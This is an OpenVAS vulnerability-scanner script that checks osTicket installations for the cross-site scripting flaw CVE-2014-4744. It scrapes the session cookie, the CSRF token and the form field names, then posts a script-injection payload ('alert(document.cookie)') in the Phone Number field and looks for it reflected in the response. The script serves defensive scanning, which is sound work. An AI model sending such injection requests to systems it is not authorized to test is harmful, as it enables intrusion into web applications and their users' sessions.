###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_osticket_mult_xss_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# osTicket Ticketing System Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804823");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2014-4744");
  script_bugtraq_id(68500);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-08-26 13:09:40 +05340 (Tue, 26 Aug 2014)");
  script_name("osTicket Ticketing System Multiple Cross-Site Scripting Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with osTicket Ticketing System and is prone to multiple
  cross-site scripting vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check whether it is able to read cookie
  or not.");
  script_tag(name:"insight", value:"Multiple flaws exist as input passed via 'Phone Number' POST parameter to the
  'open.php' script, 'Phone Number', 'passwd1', 'passwd2' POST parameters to
  'account.php' script, and 'do' parameter to 'account.php' script is not
  validated before returning it to users.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute arbitrary script
  code in a user's browser session within the trust relationship between their
  browser and the server.");
  script_tag(name:"affected", value:"osTicket before version 1.9.2");
  script_tag(name:"solution", value:"Upgrade to osTicket version 1.9.2 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/59539");
  script_xref(name:"URL", value:"https://www.netsparker.com/critical-xss-vulnerabilities-in-osticket/");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://osticket.com");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

if(!can_host_php(port:http_port)){
  exit(0);
}

host = http_host_name(port:http_port);

foreach dir (make_list_unique("/", "/support", "/ticket", "/osticket", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/upload/open.php"),  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if (rcvRes && "powered by osTicket<" >< rcvRes)
  {
    cookie = eregmatch(pattern:"Set-Cookie: OSTSESSID=([0-9a-z]*);", string:rcvRes);
    if(!cookie[1]){
      exit(0);
    }

    csrf_token = eregmatch(pattern:'csrf_token" content="([0-9a-z]*)"', string:rcvRes);
    if(!csrf_token[1]){
      exit(0);
    }

    email_id = eregmatch(pattern:'<label for="([0-9a-z]*)" class="required".*Email Address:', string:rcvRes);
    if(!email_id[1]){
      exit(0);
    }

    rcvRes = ereg_replace(pattern:'.*Email Address:', string:rcvRes, replace: "Email Address:");

    full_name = eregmatch(pattern: 'Email Address:.*<label for="([0-9a-z]*)" class="required".*Full Name:', string:rcvRes);
    if(!full_name[1]){
      exit(0);
    }

    rcvRes = ereg_replace(pattern:'.*Full Name:', string:rcvRes, replace: "Full Name:");

    phone_no = eregmatch(pattern:'Full Name:.*<label for="([0-9a-z]*)" class="".*Phone Number:', string:rcvRes);
    if(!phone_no[1]){
      exit(0);
    }

    rcvRes = ereg_replace(pattern:'.*Phone Number:', string:rcvRes, replace: "Phone Number:");

    ext = eregmatch(pattern:'Ext:.*<input type="text" name="([0-9a-z]*)-ext"', string:rcvRes);
    if(!ext[1]){
      exit(0);
    }

    rcvRes = ereg_replace(pattern:'.*-ext', string:rcvRes, replace: "-ext");

    issue = eregmatch(pattern:'<label for="([0-9a-z]*)" class="required".*Issue Summary:', string:rcvRes);
    if(!issue[1]){
      exit(0);
    }

    postData = string('-----------------------------10379450071263312649808858377\r\n',
                      'Content-Disposition: form-data; name="__CSRFToken__"\r\n\r\n', csrf_token[1], '\r\n',
                      '-----------------------------10379450071263312649808858377\r\n',
                      'Content-Disposition: form-data; name="a"\r\n',
                      '\r\nopen\r\n',
                      '-----------------------------10379450071263312649808858377\r\n',
                      'Content-Disposition: form-data; name="topicId"\r\n',
                      '\r\n\r\n',
                      '-----------------------------10379450071263312649808858377\r\n',
                      'Content-Disposition: form-data; name="', email_id[1], '"\r\n',
                      '\r\n\r\n',
                      '-----------------------------10379450071263312649808858377\r\n',
                      'Content-Disposition: form-data; name="', full_name[1], '"\r\n',
                      '\r\n\r\n',
                      '-----------------------------10379450071263312649808858377\r\n',
                      'Content-Disposition: form-data; name="', phone_no[1], '"\r\n',
                      '\r\n',
                      '"--></style></script><script>alert(document.cookie)</script>\r\n',
                      '-----------------------------10379450071263312649808858377\r\n',
                      'Content-Disposition: form-data; name="', ext[1], '-ext"\r\n',
                      '\r\n\r\n',
                      '-----------------------------10379450071263312649808858377\r\n',
                      'Content-Disposition: form-data; name="', issue[1], '"\r\n',
                      '\r\n\r\n',
                      '-----------------------------10379450071263312649808858377\r\n',
                      'Content-Disposition: form-data; name="message"\r\n',
                      '\r\n\r\n',
                      '-----------------------------10379450071263312649808858377\r\n',
                      'Content-Disposition: form-data; name="attachments[]"; filename=""\r\n',
                      'Content-Type: application/octet-stream\r\n',
                      '\r\n\r\n',
                      '-----------------------------10379450071263312649808858377\r\n',
                      'Content-Disposition: form-data; name="draft_id"\r\n',
                      '\r\n4\r\n',
                      '-----------------------------10379450071263312649808858377--\r\n');

    url = dir + "/upload/open.php";

    #Send Attack Request
    sndReq = string("POST ", url, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Cookie: OSTSESSID=", cookie[1], "\r\n",
                    "Content-Type: multipart/form-data;boundary=---------------------------10379450071263312649808858377\r\n",
                    "Content-Length: ", strlen(postData), "\r\n\r\n",
                    "\r\n", postData, "\r\n");

    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

    if(rcvRes =~ "HTTP/1\.. 200" && "></script><script>alert(document.cookie)</script>" >< rcvRes &&
       "osTicket<" >< rcvRes)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
